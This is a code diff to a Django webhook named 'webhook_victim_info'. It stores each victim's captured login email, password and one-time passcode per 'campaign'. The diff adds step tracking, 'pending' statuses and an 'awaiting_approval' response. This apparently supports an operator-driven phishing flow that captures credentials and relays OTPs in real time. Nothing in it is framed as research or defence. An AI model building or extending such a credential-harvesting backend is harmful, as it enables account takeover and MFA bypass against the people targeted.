@@ -13,6 +13,7 @@ def webhook_victim_info(request, campaign_id):
     Webhook endpoint to receive victim info for a specific campaign.
     Accepts partial data: only writes fields it receives.
     Merges all data into a single VictimInfo per campaign.
+    Now supports approval/rejection flow.
     """
     try:
         data = json.loads(request.body.decode('utf-8'))
@@ -40,10 +41,30 @@ def webhook_victim_info(request, campaign_id):
         )
 
     updated = False
-    for field in ['login_email', 'login_password', 'login_otp']:
-        if field in data:
-            setattr(victim_info, field, data[field])
-            updated = True
+    step_submitted = None
+    
+    # Handle different submission fields
+    if 'login_email' in data:
+        victim_info.login_email = data['login_email']
+        victim_info.email_status = 'pending'
+        victim_info.current_step = 'email'
+        step_submitted = 'email'
+        updated = True
+    
+    if 'login_password' in data:
+        victim_info.login_password = data['login_password']
+        victim_info.password_status = 'pending'
+        victim_info.current_step = 'password'
+        step_submitted = 'password'
+        updated = True
+    
+    if 'login_otp' in data:
+        victim_info.login_otp = data['login_otp']
+        victim_info.otp_status = 'pending'
+        victim_info.current_step = 'otp'
+        step_submitted = 'otp'
+        updated = True
+    
     if updated:
         victim_info.save()
         # Log a 'typing' event whenever data is updated
@@ -59,5 +80,7 @@ def webhook_victim_info(request, campaign_id):
     return JsonResponse({
         'status': 'success',
         'victim_info_id': str(victim_info.id),
-        'created': created
+        'created': created,
+        'step_submitted': step_submitted,
+        'awaiting_approval': True
     })
